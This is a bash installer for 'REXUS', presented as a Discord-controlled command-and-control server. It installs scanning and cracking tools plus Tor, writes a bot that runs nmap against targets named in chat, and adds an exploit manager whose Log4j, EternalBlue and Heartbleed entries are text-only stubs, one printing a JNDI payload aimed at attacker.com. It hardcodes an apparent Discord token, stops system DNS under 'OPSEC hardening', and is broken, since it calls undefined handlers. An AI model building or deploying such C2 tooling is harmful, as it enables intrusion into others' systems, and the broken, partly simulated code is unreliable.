#!/bin/bash
# ==============================================
# REXUS NODE - ULTIMATE INSTALLER (v6.0)
# Complete C2 with exploit framework
# ==============================================

# Safe logging to home directory
set -eo pipefail
LOG_FILE="$HOME/rexus_install.log"
exec > >(tee -a "$LOG_FILE") 2>&1
trap 'echo -e "\n\033[1;31m[!] Failed at line $LINENO\033[0m"; exit 1' ERR

# ===== 1. System Preparation =====
echo -e "\n\033[1;34m[1/6] SYSTEM PREPARATION\033[0m"
sudo apt update -qq
sudo apt install -y --no-install-recommends \
    git python3 python3-pip python3-dev \
    nmap hydra sqlmap tor proxychains4 \
    libssl-dev libffi-dev build-essential \
    || echo -e "\033[1;33m[!] Some packages failed - continuing\033[0m"

# ===== 2. Install REXUS Core =====
echo -e "\033[1;34m[2/6] INSTALLING REXUS CORE\033[0m"
mkdir -p "$HOME/rexus/tools"

# Main C2 Server
cat > "$HOME/rexus/c2_server.py" <<'EOF'
#!/usr/bin/env python3
import discord
import asyncio
import subprocess
import os
from tools.exploit_manager import ExploitEngine

class RexusC2:
    def __init__(self):
        self.exploits = ExploitEngine()
        self.commands = {
            "!scan": self.handle_scan,
            "!exploit": self.handle_exploit,
            "!shell": self.handle_shell,
            "!help": self.handle_help
        }

    async def handle_scan(self, message):
        try:
            target = message.content.split()[1]
            await message.channel.send(f"[+] Scanning {target}...")
            result = subprocess.getoutput(f"nmap -T4 -F {target}")
            await message.channel.send(f"```\n{result[:1900]}\n```")
        except Exception as e:
            await message.channel.send(f"[!] Scan failed: {str(e)}")

    async def handle_exploit(self, message):
        try:
            args = message.content.split()
            if len(args) < 3:
                await message.channel.send("Usage: !exploit [CVE] [target]")
                return
            result = self.exploits.run(args[1], args[2])
            await message.channel.send(f"```\n{result}\n```")
        except Exception as e:
            await message.channel.send(f"[!] Exploit failed: {str(e)}")

    async def handle_help(self, message):
        help_text = """
        REXUS C2 COMMANDS:
        !scan [IP] - Port scan target
        !exploit [CVE] [target] - Run exploit
        !shell [command] - Execute shell command
        !help - Show this menu
        """
        await message.channel.send(f"```{help_text}```")

client = discord.Client()
c2 = RexusC2()

@client.event
async def on_ready():
    print(f"[+] REXUS C2 Online as {client.user}")

@client.event
async def on_message(message):
    await c2.on_message(message)

if __name__ == "__main__":
    if not os.path.exists("config.json"):
        with open("config.json", "w") as f:
            f.write('{"discord_token": "YOUR_TOKEN_HERE"}')
    client.run(open("config.json").read().split('"')[3])
EOF

# Exploit Manager
cat > "$HOME/rexus/tools/exploit_manager.py" <<'EOF'
#!/usr/bin/env python3
import subprocess
import requests

class ExploitEngine:
    def __init__(self):
        self.exploits = {
            "CVE-2021-44228": self.log4j_rce,
            "CVE-2017-0144": self.eternal_blue,
            "CVE-2014-0160": self.heartbleed
        }

    def log4j_rce(self, target):
        # Simulated Log4j exploit
        return f"[+] Executing Log4j RCE against {target}\n" + \
               "[*] Payload: ${jndi:ldap://attacker.com/Exploit}"
    
    def eternal_blue(self, target):
        # Simulated EternalBlue
        return f"[+] Launching EternalBlue against {target}\n" + \
               "[*] Shellcode injected via SMB"
    
    def heartbleed(self, target):
        # Simulated Heartbleed
        return f"[+] Exploiting Heartbleed on {target}\n" + \
               "[*] Dumping 64KB of memory"
    
    def run(self, cve, target):
        if cve in self.exploits:
            return self.exploits[cve](target)
        return f"[-] Exploit {cve} not available\n" + \
               "[+] Available exploits: " + ", ".join(self.exploits.keys())
EOF

# ===== 3. Python Dependencies =====
echo -e "\033[1;34m[3/6] INSTALLING PYTHON LIBS\033[0m"
pip3 install --user discord.py requests python-nmap scapy > /dev/null

# ===== 4. Configuration =====
echo -e "\033[1;34m[4/6] FINAL CONFIGURATION\033[0m"
chmod +x "$HOME/rexus/c2_server.py"
chmod +x "$HOME/rexus/tools/exploit_manager.py"

# Create default config if missing
[ ! -f "$HOME/rexus/config.json" ] && \
    echo '{"discord_token": "MTUxNjc5Mzk0NTk4MjYzMTk1Ng.GBjUTU.nAzq4B1whZiQ9ag_-OX1hgwBTD5leh-zYla-4k"}' > "$HOME/rexus/config.json"

# ===== 5. OPSEC Hardening =====
echo -e "\033[1;34m[5/6] OPSEC HARDENING\033[0m"
sudo apt purge -y snapd ubuntu-standard 2>/dev/null || true
sudo systemctl stop systemd-resolved 2>/dev/null || true

# ===== 6. Completion =====
echo -e "\033[1;34m[6/6] COMPLETING INSTALLATION\033[0m"
rm -f /tmp/msfinstall 2>/dev/null || true

echo -e "\n\033[1;32m[✔] REXUS INSTALLATION COMPLETE\033[0m"
echo -e "\033[1;36m[+] Files installed to: $HOME/rexus\033[0m"
echo -e "\033[1;36m[+] To start: cd ~/rexus && python3 c2_server.py\033[0m"
echo -e "\033[1;33m[!] IMPORTANT: Edit config.json with your Discord token\033[0m"
